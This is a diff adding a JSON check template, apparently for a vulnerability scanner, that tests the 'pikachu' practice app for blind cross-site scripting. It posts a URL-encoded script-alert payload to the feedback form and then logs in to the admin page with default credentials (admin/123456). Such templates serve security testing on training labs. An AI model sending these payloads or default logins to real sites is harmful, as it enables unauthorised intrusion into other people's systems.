@@ -1,0 +1,44 @@
+
+{
+    "name": "pikachu",
+    "vuln": "xss盲打",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "3",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/xss/xssblind/xss_blind.php",
+                "cookie": "",
+                "requestheader": {"Content-Type": "application/x-www-form-urlencoded"},
+                "requestbody": "content=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&name=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&submit=%E6%8F%90%E4%BA%A4"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "你已经登陆成功"
+            }
+        },
+        "2": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/xss/xssblind/admin_login.php",
+                "cookie": "",
+                "requestheader": {"Content-Type": "application/x-www-form-urlencoded"},
+                "requestbody": "username=admin&password=123456&submit=Login"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "xss"
+            }
+        }
+    }
+}
